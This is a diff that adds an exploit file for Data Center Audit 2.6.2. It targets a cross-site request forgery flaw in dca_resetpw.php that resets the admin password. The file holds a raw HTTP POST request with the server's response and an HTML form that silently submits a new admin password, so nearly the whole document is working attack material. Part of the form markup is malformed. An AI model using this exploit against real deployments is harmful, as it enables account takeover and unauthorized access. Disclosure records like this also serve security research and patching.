@@ -1,0 +1,52 @@
+# Exploit Title: Data Center Audit 2.6.2 - Cross-Site Request Forgery (Update Admin)
+# Dork: N/A
+# Date: 2018-11-09
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: https://sourceforge.net/projects/datacenteraudit/
+# Software Link: https://netix.dl.sourceforge.net/project/datacenteraudit/data_center_audit_v262.zip
+# Version: 2.6.2
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/dca_resetpw.php
+# 
+POST /[PATH]/dca_resetpw.php HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 57
+updateuser=admin&pass=efe&pass2=efe&submit_reset=VerAyari
+HTTP/1.1 200 OK
+Date: Fri, 09 Nov 2018 12:47:37 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Content-Length: 842
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 2)
+# http://localhost/[PATH]/dca_resetpw.php
+# 
+<html>
+<body>
+<form action="http://localhost/[PATH]/dca_resetpw.php" method="post">
+Username:admin
+<input name="updateuser" value="admin" type="hidden">
+New Password:
+<input name="pass" maxlength="10" type="password">
+Confirm Password:
+<input name="pass2" maxlength="10" type="password">
+input name="submit_reset" value="Change Password" type="submit">
+</table>
+</form>
+</body>
+</html>
